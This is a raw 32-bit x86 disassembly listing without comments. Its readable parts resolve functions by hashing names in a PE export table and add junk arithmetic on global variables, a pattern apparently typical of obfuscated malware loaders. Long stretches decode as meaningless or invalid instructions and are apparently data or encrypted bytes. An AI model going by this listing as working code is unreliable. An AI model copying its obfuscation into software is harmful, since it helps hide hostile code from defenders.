  40c4d4:	mov    DWORD PTR ds:0x4337eb,esi
  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x4337bb,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433783,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x43376f,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
  40c509:	and    DWORD PTR ds:0x4337fb,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x4337eb,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x4337f3,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0x4cbb5658
  40c577:	inc    ebp
  40c578:	push   0x7e7e8118
  40c57d:	jge    0x40c5fc
  40c57f:	jle    0x40c5ff
  40c581:	push   ebp
  40c582:	out    dx,al
  40c583:	xor    esp,edx
  40c585:	sbb    bh,BYTE PTR [eax-0x24]
  40c588:	(bad)  
  40c589:	mov    ch,0x50
  40c58b:	mov    dl,0xda
  40c58d:	inc    eax
  40c58e:	arpl   WORD PTR [ecx+esi*4],cx
  40c591:	xor    eax,0x18d74022
  40c596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c597:	mov    ds:0x81734ba,al
  40c59c:	stos   DWORD PTR es:[edi],eax
  40c59d:	scas   al,BYTE PTR es:[edi]
  40c59e:	leave  
  40c59f:	inc    esp
  40c5a0:	out    0xfb,eax
  40c5a2:	inc    esp
  40c5a3:	lock adc eax,0xfca26276
  40c5a9:	jb     0x40c5f5
  40c5ab:	shl    BYTE PTR ds:0x8e182cc8,cl
  40c5b1:	popa   
  40c5b2:	ins    BYTE PTR es:[edi],dx
  40c5b3:	ins    BYTE PTR es:[edi],dx
  40c5b4:	int    0xa1
  40c5b6:	xor    eax,0xffffffaa
  40c5b9:	setnp  BYTE PTR [ecx+esi*4+0x30]
  40c5be:	cmp    al,0xcb
  40c5c0:	mov    ecx,0x9068f83d
  40c5c5:	sub    BYTE PTR [esi-0x169b6647],bh
  40c5cb:	dec    edi
  40c5cc:	xchg   edx,eax
  40c5cd:	stos   BYTE PTR es:[edi],al
  40c5ce:	ret    0x7da
  40c5d1:	mov    ah,0x3b
  40c5d3:	retf   
  40c5d4:	in     al,0x9f
  40c5d6:	mov    eax,ds:0x852c4220
  40c5db:	dec    ebx
  40c5dc:	shr    DWORD PTR [ecx+0x48],1
  40c5df:	enter  0x131d,0x6b
  40c5e3:	fbld   TBYTE PTR [esi+ebp*8]
  40c5e6:	mov    bh,0x16
  40c5e8:	mov    ecx,0x8aed5627
  40c5ed:	push   cs
  40c5ee:	addr16 lock and dh,dl
  40c5f2:	mov    edi,0x3cdda93
  40c5f7:	mul    BYTE PTR ss:[ebx]
  40c5fa:	sti    
  40c5fb:	push   ebx
  40c5fc:	test   al,0x9e
  40c5fe:	and    eax,0x7becac7b
  40c603:	sbb    al,BYTE PTR [esp+eax*1]
  40c606:	add    BYTE PTR [edi+edi*1-0x1],ch
  40c60a:	inc    eax
  40c60b:	cmp    al,0x66
  40c60d:	adc    eax,0x8b14b1e5
  40c612:	mov    BYTE PTR [eax+esi*2-0x52e99eff],0x8c
  40c61a:	ficom  WORD PTR [eax-0x138e4985]
  40c620:	inc    esp
  40c621:	outs   dx,DWORD PTR ds:[esi]
  40c622:	dec    edi
  40c623:	inc    ecx
  40c624:	add    al,0x7c
  40c626:	nop
  40c627:	adc    al,0x61
  40c629:	mov    edi,gs
  40c62b:	loope  0x40c604
  40c62d:	add    BYTE PTR [edx-0x3f],0x37
  40c631:	add    DWORD PTR [ecx],ebp
  40c633:	(bad)  
  40c634:	mov    edi,0xd6608a9e
  40c639:	inc    ebp
  40c63a:	clc    
  40c63b:	jge    0x40c5e5
  40c63d:	int3   
  40c63e:	lds    ecx,FWORD PTR [ecx-0x61ed8d88]
  40c644:	aas    
  40c645:	or     DWORD PTR ds:0xb4e7af5b,esi
  40c64b:	in     eax,0x2e
  40c64d:	mov    cl,0xda
  40c64f:	call   0xda4fd69b
  40c654:	lods   eax,DWORD PTR ds:[esi]
  40c655:	mov    ch,0x1c
  40c657:	inc    esi
  40c658:	aam    0x8
  40c65a:	mov    DWORD PTR [ebx],ebp
  40c65c:	mov    esi,0x1f95537e
  40c661:	mov    esp,0xb6e42b7f
  40c666:	lods   al,BYTE PTR ds:[esi]
  40c667:	push   esp
  40c668:	xchg   dl,bh
  40c66a:	or     BYTE PTR [ecx-0x64],bl
  40c66d:	dec    ebx
  40c66e:	mov    WORD PTR [edx-0x59e02ec9],cs
  40c674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c675:	xlat   BYTE PTR ds:[ebx]
  40c676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c677:	cdq    
  40c678:	sbb    al,0xd6
  40c67a:	retf   0x5890
  40c67d:	jno    0x40c654
  40c67f:	repnz pop edx
  40c681:	std    
  40c682:	adc    al,0xf6
  40c684:	ins    DWORD PTR es:[edi],dx
  40c685:	(bad)
  40c688:	call   0x8e90:0x8b754490
  40c68f:	inc    esi
  40c690:	mov    eax,ds:0xf57f1b10
  40c695:	inc    eax
  40c696:	test   eax,0xc65c1279
  40c69b:	xchg   edi,eax
  40c69c:	mov    ebx,ds
  40c69e:	sub    al,0xbf
  40c6a0:	mov    ch,0x13
  40c6a2:	and    eax,0x6393059
  40c6a7:	and    bh,BYTE PTR [edi-0x29]
  40c6aa:	mov    eax,ds:0xbfe5ce94
  40c6af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6b0:	xor    eax,0x2fe4cbfe
  40c6b5:	loope  0x40c6db
  40c6b7:	xor    eax,0x5f3c0101
  40c6bc:	test   eax,0x73e870f0
  40c6c1:	test   eax,0x6e652a6d
  40c6c6:	or     edx,DWORD PTR [edi]
  40c6c8:	cld    
  40c6c9:	neg    BYTE PTR [ebp+0x30]
  40c6cc:	popf   
  40c6cd:	and    eax,0xb4c0c8a1
  40c6d2:	fldcw  WORD PTR [ebx+0xc]
  40c6d5:	inc    eax
  40c6d6:	pop    esp
  40c6d7:	fwait
  40c6d8:	pop    ecx
  40c6d9:	pop    ebx
  40c6da:	lock jns 0x40c684
  40c6dd:	jmp    0x40c6ba
  40c6df:	popf   
  40c6e0:	retf   
  40c6e1:	mov    bh,0x56
  40c6e3:	test   DWORD PTR [esi-0x3f],esi
  40c6e6:	mov    ds,WORD PTR [esi+0x40fbcfb3]
  40c6ec:	pop    esi
  40c6ed:	or     BYTE PTR [esi+edi*8+0x11833611],dl
  40c6f4:	iret   
  40c6f5:	dec    ebp
  40c6f6:	jl     0x40c68b
  40c6f8:	xor    esi,esp
  40c6fa:	js     0x40c6f9
  40c6fc:	std    
  40c6fd:	ss cmp eax,0x1fe68259
  40c703:	jbe    0x40c758
  40c705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c706:	sub    BYTE PTR [ecx],bl
  40c708:	sbb    cl,BYTE PTR [edi-0x58c55c88]
  40c70e:	and    DWORD PTR [esi+0x13],0x26
  40c712:	pusha  
  40c713:	es sub al,0xa4
  40c716:	jo     0x40c6c7
  40c718:	push   ebx
  40c719:	mov    eax,cs
  40c71b:	xchg   ebx,ecx
  40c71d:	add    al,0xa7
  40c71f:	imul   ebx,ebp,0x77
  40c722:	and    al,0xb8
  40c724:	mov    cl,0x78
  40c726:	jbe    0x40c795
  40c728:	cdq    
  40c729:	test   al,0x63
  40c72b:	sbb    BYTE PTR [ebx],bh
  40c72d:	ins    DWORD PTR es:[edi],dx
  40c72e:	push   ebx
  40c72f:	leave  
  40c730:	mov    ecx,0x18b5649
  40c735:	aas    
  40c736:	call   0x1cadb3f1
  40c73b:	adc    BYTE PTR [eax+0x49],bh
  40c73e:	cld    
  40c73f:	push   0xd80008cf
  40c744:	fcmovb st,st(3)
  40c746:	dec    edx
  40c747:	mov    bh,0xc7
  40c749:	fldenv [esp+esi*4-0x732cf748]
  40c750:	jp     0x40c71a
  40c752:	fimul  WORD PTR [ebp-0x71]
  40c755:	ins    BYTE PTR es:[edi],dx
  40c756:	fucomip st,st(1)
  40c758:	xchg   edi,eax
  40c759:	add    al,0x4f
  40c75b:	add    DWORD PTR [eax-0x62b0a9c3],0x92afd8e3
  40c765:	jae    0x40c6fb
  40c767:	inc    esp
  40c768:	jmp    0xcee19aa4
  40c76d:	mov    ecx,0xeffbeb98
  40c772:	rol    DWORD PTR [edi],cl
  40c774:	jl     0x40c7b0
  40c776:	lea    ecx,[ebp-0x9a26b52]
  40c77c:	xchg   BYTE PTR [edi+0x38],ah
  40c77f:	test   DWORD PTR [ecx],edi
  40c781:	push   ss
  40c782:	repz fdivrp st(7),st
  40c785:	rcl    DWORD PTR [esi-0x1f],1
  40c788:	arpl   cx,di
  40c78a:	xchg   BYTE PTR [ecx],dl
  40c78c:	outs   dx,BYTE PTR ds:[esi]
  40c78d:	jae    0x40c784
  40c78f:	xchg   ebx,eax
  40c790:	xchg   esp,eax
  40c791:	push   edx
  40c792:	pop    ebx
  40c793:	xchg   DWORD PTR [ecx+0x5aa4b475],edx
  40c799:	adc    al,0x84
  40c79b:	fwait
  40c79c:	xchg   esp,eax
  40c79d:	addr16 ret 0xa192
  40c7a1:	pop    ebx
  40c7a2:	jb     0x40c75b
  40c7a4:	in     eax,0x3d
  40c7a6:	inc    edx
  40c7a7:	pusha  
  40c7a8:	sub    BYTE PTR [eax-0xc675f90],dh
  40c7ae:	out    dx,al
  40c7af:	push   0xffffffc9
  40c7b1:	xor    bl,BYTE PTR [ebx]
  40c7b3:	inc    ebp
  40c7b4:	jo     0x40c779
  40c7b6:	push   0x6c4b9c4
  40c7bb:	mov    ah,0xfe
  40c7bd:	inc    edx
  40c7be:	inc    eax
  40c7bf:	jg     0x40c77a
  40c7c1:	jb     0x40c818
  40c7c3:	mov    eax,ds:0xb895614f
  40c7c8:	cld    
  40c7c9:	xor    dh,BYTE PTR [ecx+0x69]
  40c7cc:	inc    esi
  40c7cd:	adc    BYTE PTR [ebx],bh
  40c7cf:	push   ecx
  40c7d0:	mov    edi,0xe4d6d9d6
  40c7d5:	dec    esp
  40c7d6:	cmp    ebx,edx
  40c7d8:	ds jne 0x40c859
  40c7db:	or     BYTE PTR [ebx+esi*1-0x21],ch
  40c7df:	js     0x40c7f7
  40c7e1:	sub    DWORD PTR [edx-0x46],edi
  40c7e4:	xchg   ebp,eax
  40c7e5:	fistp  DWORD PTR [esi]
  40c7e7:	adc    BYTE PTR [eax],ch
  40c7e9:	es jae 0x40c842
  40c7ec:	shl    DWORD PTR ds:0xe628ffef,1
  40c7f2:	cmp    eax,0x234bef58
  40c7f7:	sub    BYTE PTR [esp+eax*2-0x45790a65],dh
  40c7fe:	dec    eax
  40c7ff:	and    BYTE PTR [ebp+0x16],al
  40c802:	scas   eax,DWORD PTR es:[edi]
  40c803:	xor    eax,0x783d932e
  40c808:	or     ch,BYTE PTR [ecx-0x22cf494e]
  40c80e:	adc    al,0xe3
  40c810:	fcmovnbe st,st(7)
  40c812:	loopne 0x40c859
  40c814:	test   DWORD PTR [edx-0x7f],ebp
  40c817:	retf   0x3ad2
  40c81a:	sti    
  40c81b:	sbb    eax,0xc7c0ce4d
  40c820:	dec    ebp
  40c821:	and    BYTE PTR [ebx+eiz*2-0x4d],ah
  40c825:	pop    ebx
  40c826:	adc    eax,0xacf5c092
  40c82b:	adc    cl,BYTE PTR [ecx-0x7b1a3efd]
  40c831:	pop    ss
  40c832:	jae    0x40c8aa
  40c834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c835:	es rcl eax,0xd9
  40c839:	push   ds
  40c83a:	push   cs
  40c83b:	mov    esi,0x4f49f054
  40c840:	and    DWORD PTR [esp+edi*1],ecx
  40c843:	add    al,0xef
  40c845:	pop    eax
  40c846:	push   0xffffffea
  40c848:	std    
  40c849:	outs   dx,DWORD PTR ds:[esi]
  40c84a:	mov    esp,0x3586b769
  40c84f:	jle    0x40c7fe
  40c851:	or     dh,BYTE PTR [edx-0xfce8b16]
  40c857:	pop    edi
  40c858:	data16 std 
  40c85a:	push   esp
  40c85b:	call   0x7088cb35
  40c860:	jb     0x40c7eb
  40c862:	dec    ebx
  40c863:	inc    edi
  40c864:	jnp    0x40c8b5
  40c866:	jmp    0xee2a:0xffdff56a
  40c86d:	xchg   ebp,eax
  40c86e:	(bad)  
  40c86f:	sub    DWORD PTR [edx+0x1],esp
  40c872:	rcl    BYTE PTR [eax+0x5db9ba4e],0x5a
  40c879:	cmp    esi,0xd96387e2
  40c87f:	int    0x47
  40c881:	test   BYTE PTR [edx+0x6e],ch
  40c884:	mov    eax,DWORD PTR [ebp-0x14]
  40c887:	mov    ecx,DWORD PTR [ebp+0x8]
  40c88a:	add    ecx,DWORD PTR [eax+0x1c]
  40c88d:	xor    esi,esi
  40c88f:	mov    DWORD PTR [ebp-0x14],ecx
  40c892:	mov    eax,DWORD PTR [ebp-0x28]
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	push   ds
  40c8b3:	hlt    
  40c8b4:	sub    cl,BYTE PTR [esi+0x27]
  40c8b7:	mov    WORD PTR [esi+0x7e],?
  40c8ba:	jge    0x40c939
  40c8bc:	jle    0x40c93c
  40c8be:	test   ah,bl
  40c8c0:	jle    0x40c8fe
  40c8c2:	int    0x61
  40c8c4:	not    DWORD PTR [edi+0x30]
  40c8c7:	daa    
  40c8c8:	lahf   
  40c8c9:	lods   al,BYTE PTR ds:[esi]
  40c8ca:	imul   edx,ebx,0x95d70368
  40c8d0:	and    esp,ecx
  40c8d2:	bndstx [edi],bnd3
  40c8d5:	xchg   ecx,eax
  40c8d6:	and    al,0x91
  40c8d8:	ror    ebx,1
  40c8da:	loopne 0x40c959
  40c8dc:	cli    
  40c8dd:	sti    
  40c8de:	stos   DWORD PTR es:[edi],eax
  40c8df:	icebp  
  40c8e0:	and    DWORD PTR [ebp-0x45],ebp
  40c8e3:	imul   esi,DWORD PTR [edx],0x888f7e11
  40c8e9:	jle    0x40c944
  40c8eb:	xor    cl,BYTE PTR [eax+0x20]
  40c8ee:	fwait
  40c8ef:	adc    eax,0xe390185d
  40c8f4:	jecxz  0x40c951
  40c8f6:	addr16 dec edi
  40c8f8:	cwde   
  40c8f9:	retf   
  40c8fa:	xchg   ebp,eax
  40c8fb:	pop    ecx
  40c8fc:	mov    WORD PTR [edi+0x324e3bd6],?
  40c902:	dec    edi
  40c903:	sbb    bl,bl
  40c905:	and    eax,0x386d2e
  40c90a:	adc    esi,DWORD PTR [ebx]
  40c90c:	add    dl,bh
  40c90e:	out    0x9c,al
  40c910:	mov    dh,0xb6
  40c912:	mov    esp,0x25ac35ea
  40c917:	stos   DWORD PTR es:[edi],eax
  40c918:	jmp    0x40c911
  40c91a:	mov    ebp,0xee3ae624
  40c91f:	cdq    
  40c920:	mov    dl,0xb5
  40c922:	outs   dx,DWORD PTR ds:[esi]
  40c923:	jbe    0x40c958
  40c925:	repnz adc eax,0x42377161
  40c92b:	inc    edi
  40c92c:	jb     0x40c958
  40c92e:	mov    cl,0x8e
  40c930:	add    DWORD PTR [esi-0x22a163d1],ebp
  40c936:	aaa    
  40c937:	mov    al,ds:0xc0b19d82
  40c93c:	pop    DWORD PTR [ecx+0x28]
  40c93f:	popa   
  40c940:	pop    ebx
  40c941:	popf   
  40c942:	or     eax,0xa799376c
  40c947:	and    ch,BYTE PTR [ecx]
  40c949:	add    ecx,ebp
  40c94b:	stos   BYTE PTR es:[edi],al
  40c94c:	xlat   BYTE PTR ds:[ebx]
  40c94d:	pop    ss
  40c94e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c94f:	mov    ch,0x6e
  40c951:	test   al,0x28
  40c953:	push   0xffffffc2
  40c955:	frstor [esi]
  40c957:	stos   DWORD PTR es:[edi],eax
  40c958:	jecxz  0x40c977
  40c95a:	push   esi
  40c95b:	inc    ebx
  40c95c:	fcomip st,st(5)
  40c95e:	xchg   al,cl
  40c960:	jmp    0x40c970
  40c962:	jecxz  0x40c9a3
  40c964:	vandnps ymm0,ymm2,YMMWORD PTR [esi+0x68e1283]
  40c96c:	mov    ebx,0x63a82e7e
  40c971:	mov    eax,0x62b041c4
  40c976:	(bad)  
  40c977:	xlat   BYTE PTR ds:[ebx]
  40c978:	out    dx,al
  40c979:	pop    ecx
  40c97a:	jp     0x40c930
  40c97c:	mov    ?,WORD PTR ds:0x999f0553
  40c982:	lods   eax,DWORD PTR ds:[esi]
  40c983:	sub    DWORD PTR ss:[edi+0x16510217],eax
  40c98a:	imul   eax,DWORD PTR [ecx-0x6c4cba2e],0x2c
  40c991:	mov    edx,0x22364cd8
  40c996:	lds    esi,FWORD PTR [ebx]
  40c998:	test   esi,edx
  40c99a:	lods   al,BYTE PTR ds:[esi]
  40c99b:	in     eax,0x76
  40c99d:	jmp    0xcd0d64bf
  40c9a2:	push   cs
  40c9a3:	add    al,0x6c
  40c9a5:	cmp    al,BYTE PTR [ecx-0x705453c9]
  40c9ab:	mov    ah,0xba
  40c9ad:	dec    ebp
  40c9ae:	lods   eax,DWORD PTR ds:[esi]
  40c9af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9b0:	imul   ecx,DWORD PTR [ebx-0x62],0xebe1804f
  40c9b7:	adc    al,0xab
  40c9b9:	mov    ds:0x810a3831,eax
  40c9be:	ja     0x40ca1a
  40c9c0:	cwde   
  40c9c1:	adc    BYTE PTR [ebp+0xa],dh
  40c9c4:	xchg   DWORD PTR [ebp+0x7f],esi
  40c9c7:	lahf   
  40c9c8:	xor    al,0xd5
  40c9ca:	jmp    0x40c99a
  40c9cc:	pop    edi
  40c9cd:	call   0xa6ea7fb9
  40c9d2:	sbb    ebx,edx
  40c9d4:	ror    BYTE PTR [ebx+edi*2-0x14],0xd5
  40c9d9:	sbb    al,0xec
  40c9db:	adc    DWORD PTR [ecx+0x2444ed69],esi
  40c9e1:	cmp    al,0xf9
  40c9e3:	sahf   
  40c9e4:	pop    edi
  40c9e5:	call   0xf9cd:0xc7446870
  40c9ec:	mov    ah,BYTE PTR [eax+ecx*8]
  40c9ef:	out    0x99,al
  40c9f1:	or     bh,al
  40c9f3:	mov    ecx,0x5b3bf81c
  40c9f8:	sbb    eax,0x2407a233
  40c9fd:	cs xchg esp,eax
  40c9ff:	aaa    
  40ca00:	sbb    bh,BYTE PTR [eax]
  40ca02:	xor    bl,bl
  40ca04:	rol    DWORD PTR ds:0xdce5e5bd,0x71
  40ca0b:	mov    al,0x6f
  40ca0d:	rcr    DWORD PTR [edi],cl
  40ca0f:	call   0x598b:0xc635a2ff
  40ca16:	aaa    
  40ca17:	ror    DWORD PTR [edx-0xa],cl
  40ca1a:	jmp    0x1480:0xa3c9af64
  40ca21:	repnz push ebp
  40ca23:	hlt    
  40ca24:	mov    al,ds:0x70726257
  40ca29:	adc    DWORD PTR [eax-0x4],ebp
  40ca2c:	mov    ds:0xc937b13c,al
  40ca31:	mov    bh,0xef
  40ca33:	sub    esp,DWORD PTR [ebx-0x6c]
  40ca36:	fidiv  WORD PTR ds:0x2fa09f48
  40ca3c:	mov    edi,0x6a062614
  40ca41:	das    
  40ca42:	xlat   BYTE PTR ds:[ebx]
  40ca43:	sbb    BYTE PTR [edx-0x74c03881],ah
  40ca49:	repnz loope 0x40ca43
  40ca4c:	fwait
  40ca4d:	mov    bl,0x83
  40ca4f:	call   0x6116eef8
  40ca54:	hlt    
  40ca55:	test   eax,0x6ba2b0c2
  40ca5a:	fistp  QWORD PTR [ebp-0x2e]
  40ca5d:	sub    dl,bh
  40ca5f:	push   0x4
  40ca61:	jg     0x40cade
  40ca63:	imul   ebp,DWORD PTR [ebx+ebx*4],0x5e
  40ca67:	shl    BYTE PTR [esi],0xdc
  40ca6a:	inc    ebx
  40ca6b:	les    esp,FWORD PTR [edi+eiz*8-0x3d]
  40ca6f:	dec    DWORD PTR [eax+eiz*8+0x29923bb]
  40ca76:	xor    al,BYTE PTR [edx]
  40ca78:	nop
  40ca79:	enter  0x974e,0x46
  40ca7d:	aas    
  40ca7e:	hlt    
  40ca7f:	iret   
  40ca80:	popf   
  40ca81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca82:	xchg   ecx,eax
  40ca83:	sar    BYTE PTR [esp+ecx*2+0x4],0x25
  40ca88:	imul   esp,DWORD PTR [eax],0xffffffba
  40ca8b:	push   es
  40ca8c:	mov    ebx,0x1b4d069d
  40ca91:	scas   al,BYTE PTR es:[edi]
  40ca92:	push   edx
  40ca93:	dec    edi
  40ca94:	xor    ch,BYTE PTR [ebx-0x3e]
  40ca97:	arpl   WORD PTR [ecx-0x1d381156],si
  40ca9d:	test   al,0xe7
  40ca9f:	add    BYTE PTR [ecx+0x2b3431a7],bh
  40caa5:	mov    ah,0x6e
  40caa7:	repz mov esp,ecx
  40caaa:	ja     0xf37ae353
  40cab0:	test   BYTE PTR [ecx-0x12],dh
  40cab3:	sbb    eax,0xed3429b
  40cab8:	xchg   edi,eax
  40cab9:	ja     0x40cb10
  40cabb:	sub    al,0xfe
  40cabd:	xchg   edx,eax
  40cabe:	cmp    esi,ebp
  40cac0:	clc    
  40cac1:	cs jne 0x40cb3e
  40cac4:	cmp    esp,eax
  40cac6:	popf   
  40cac7:	mov    ch,0xe9
  40cac9:	mov    bl,0xa1
  40cacb:	(bad)  
  40cacc:	push   ecx
  40cacd:	dec    esi
  40cace:	clc    
  40cacf:	mov    eax,0xd134ba5e
  40cad4:	sub    DWORD PTR [esi-0x55],ebx
  40cad7:	enter  0x1bd7,0xf5
  40cadb:	adc    ch,BYTE PTR [ebx]
  40cadd:	rcr    DWORD PTR [edi-0x24f5e9bc],cl
  40cae3:	cld    
  40cae4:	pop    eax
  40cae5:	and    ebx,DWORD PTR [ebp+0x6fa1aa10]
  40caeb:	aam    0xe0
  40caed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caee:	or     DWORD PTR [ebx-0x4c00badd],edi
  40caf4:	mov    esi,0x36e4020d
  40caf9:	pop    es
  40cafa:	dec    ebx
  40cafb:	mov    edx,0xd3917ef1
  40cb00:	sti    
  40cb01:	outs   dx,DWORD PTR ds:[esi]
  40cb03:	ins    DWORD PTR es:[edi],dx
  40cb04:	lds    ecx,FWORD PTR [ecx+0x1c]
  40cb07:	or     BYTE PTR [eax],0x2b
  40cb0a:	sahf   
  40cb0b:	sbb    DWORD PTR [ecx],edx
  40cb0d:	jl     0x40cad9
  40cb0f:	or     BYTE PTR [eax],ch
  40cb11:	pop    edx
  40cb12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb13:	pop    ss
  40cb14:	cmp    DWORD PTR [eax+0x3ab3e834],ecx
  40cb1a:	xor    edx,eax
  40cb1c:	in     al,0x8c
  40cb1e:	jmp    0x8f50:0x1a6f3fd0
  40cb25:	(bad)  
  40cb26:	mov    ds:0x67c8fb8a,al
  40cb2b:	jg     0x40cad3
  40cb2d:	and    al,0xa1
  40cb2f:	daa    
  40cb30:	call   0xfe23:0xe178905e
  40cb37:	fisttp QWORD PTR [ebx+ebp*2]
  40cb3a:	lock fcomp DWORD PTR [edi]
  40cb3d:	add    al,0x2b
  40cb3f:	pop    ss
  40cb40:	loop   0x40cb5e
  40cb42:	xchg   ebp,eax
  40cb43:	push   ecx
  40cb44:	popf   
  40cb45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb46:	and    al,0xa8
  40cb48:	mov    esi,DWORD PTR [eax+0x7c]
  40cb4b:	rcr    bl,cl
  40cb4d:	les    edi,FWORD PTR [esi]
  40cb4f:	std    
  40cb50:	test   BYTE PTR [edx+0x73],dl
  40cb53:	neg    DWORD PTR [esp+edx*1]
  40cb56:	dec    edx
  40cb57:	out    0x34,eax
  40cb59:	lock dec ebp
  40cb5b:	adc    al,0x32
  40cb5d:	loop   0x40cb72
  40cb5f:	test   DWORD PTR [ecx],ebx
  40cb61:	xchg   ebx,eax
  40cb62:	test   eax,0xe6a36ef
  40cb67:	shr    BYTE PTR [eax+edx*4],0x1b
  40cb6b:	call   0x406e:0x63dbdb43
  40cb72:	push   0xffffffba
  40cb74:	cwde   
  40cb75:	mov    dh,0x77
  40cb77:	fisub  DWORD PTR [esi]
  40cb79:	push   edi
  40cb7a:	sbb    BYTE PTR [esp+edi*4-0x12f2f15],ah
  40cb81:	stos   BYTE PTR es:[edi],al
  40cb82:	cmp    ebp,ecx
  40cb84:	xor    al,0xfe
  40cb86:	fwait
  40cb87:	push   ebp
  40cb88:	outs   dx,DWORD PTR ds:[esi]
  40cb89:	(bad)  
  40cb8a:	scas   eax,DWORD PTR es:[edi]
  40cb8b:	dec    esi
  40cb8c:	repz call 0x5b24:0x42cb1cd2
  40cb94:	push   0xffffffb9
  40cb96:	mov    al,0xac
  40cb98:	sbb    bh,BYTE PTR [edx+0xa8295c8]
  40cb9e:	inc    esp
  40cb9f:	adc    al,0xa
  40cba1:	ds (bad) 
  40cba3:	mov    ds,WORD PTR [ebp-0x20]
  40cba6:	stos   DWORD PTR es:[edi],eax
  40cba7:	(bad)  
  40cba8:	in     eax,dx
  40cba9:	outs   dx,BYTE PTR ds:[esi]
  40cbaa:	loope  0x40cb6f
  40cbac:	cmc    
  40cbad:	call   0x53817932
  40cbb2:	or     DWORD PTR ds:0x49215fd6,ebp
  40cbb8:	mov    ebx,0xb30104a2
  40cbbd:	dec    edx
  40cbbe:	mov    al,cl
  40cbc0:	or     DWORD PTR [eax-0x1],edx
  40cbc3:	jne    0x40cb95
  40cbc5:	push   DWORD PTR [ebp+0xc]
  40cbc8:	call   0x410a7f
  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0x6312ddfc
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	xor    ch,BYTE PTR [eax+0x43]
  40cc51:	test   BYTE PTR ds:0x562bbfe2,ah
  40cc57:	dec    edx
  40cc58:	jl     0x40cc67
  40cc5a:	mov    ah,0xc8
  40cc5c:	xchg   esi,eax
  40cc5d:	xchg   edx,eax
  40cc5e:	out    dx,eax
  40cc5f:	(bad)  
  40cc60:	sbb    eax,0xcf1da1ad
  40cc65:	(bad)  
  40cc67:	test   BYTE PTR es:[edx],bh
  40cc6a:	cmp    dl,BYTE PTR [edi-0x79]
  40cc6d:	stos   DWORD PTR es:[edi],eax
  40cc6e:	add    ch,BYTE PTR [ecx]
  40cc70:	jmp    0x40cc81
  40cc72:	test   DWORD PTR [eax-0x3753b30a],0x18a74423
  40cc7c:	mov    bh,0x40
  40cc7e:	in     al,0xdb
